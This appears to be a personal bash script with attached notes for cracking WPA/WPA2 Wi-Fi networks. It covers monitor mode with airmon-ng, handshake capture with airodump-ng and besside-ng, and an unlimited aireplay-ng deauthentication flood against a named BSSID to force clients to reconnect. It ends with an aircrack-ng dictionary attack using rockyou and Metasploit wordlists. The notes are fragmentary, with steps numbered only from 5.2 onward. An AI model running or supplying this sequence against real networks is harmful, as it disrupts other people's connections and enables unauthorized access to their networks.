#!/bin/bash

clear
sudo ifconfig
echo "-------------------------"
sudo iwconfig
echo "-------------------------"
sudo /usr/sbin/airmon-ng 

port="wlp1s0"
monport="wlp1s0mon"

echo "[1]:airmon-ng check kill"
sudo airmon-ng check kill

echo "[2]: airmon-ng start $port"
sudo airmon-ng start $port # Start monitoring $port
sudo /usr/sbin/airmon-ng 

echo "[3]: sudo airodump-ng $monport -w handshakes -b abg"
  
sudo airodump-ng $monport -w handshakes -b abg



5.2 Another way 
    
    besside-ng -W -c 6 -b 00:00:11:22:33:44 wlp1s0mon
    with this method there  is no need to do stage 6.

6.  Open a new terminal window to disconnect the clients connected 
    to the target network.  
  sudo aireplay-ng -0 0 -a 3C:7C:3F:B5:F3:A0 wlp1s0mon
     
     aireplay-ng : To inject frames
    -0 : For deauthentication
    10 : No. of deauthentication packets to be sent
         (0 would mean infinite)
           
    -a : For the bssid of the target network
    wlp1s0mon : Name of the interface.
 
  When the client is disconnected from the target network. 
  He tries to reconnect to the network and when ie does you will
   get something called WPA handshake in the previous window of
    the terminal. 
    something like
   CH 11 ][ Elapsed: 8 mins ][ 2025-11-08 10:32 ][ WPA handshake: 6E:1C:CA:A3:1A:77 
 
 
 7. To decrypt the password.   
 
 sudo aircrack-ng -a2 -b 3C:7C:3F:B5:F3:A0 -w /usr/share/wordlists/rockyou.txt ./-01.cap
 
 aircrack-ng : 802.11 WEP and WPA-PSK keys cracking program
-a : -a2 for WPA2 & -a for WPA network
-b : The BSSID of the target network
-w : Location of the wordlist file
-01.cap : cap file
 
 
 
 passward lists
  /usr/share/wordlists/rockyou.txt
  /usr/share/wordlists/wifite.txt
  /usr/share/metasploit-framework/data/wordlists/sid.txt
  /usr/share/metasploit-framework/data/wordlists/common_roots.txt 
   
https://www.geeksforgeeks.org/linux-unix/how-to-hack-wpa-wpa2-wifi-using-kali-linux/
 

Restart stopped services to reactivate your network connection
sudo airmon-ng stop wlp1s0mon
 

Run sudo /usr/sbin/airmon-ng without any arguments to see available interface

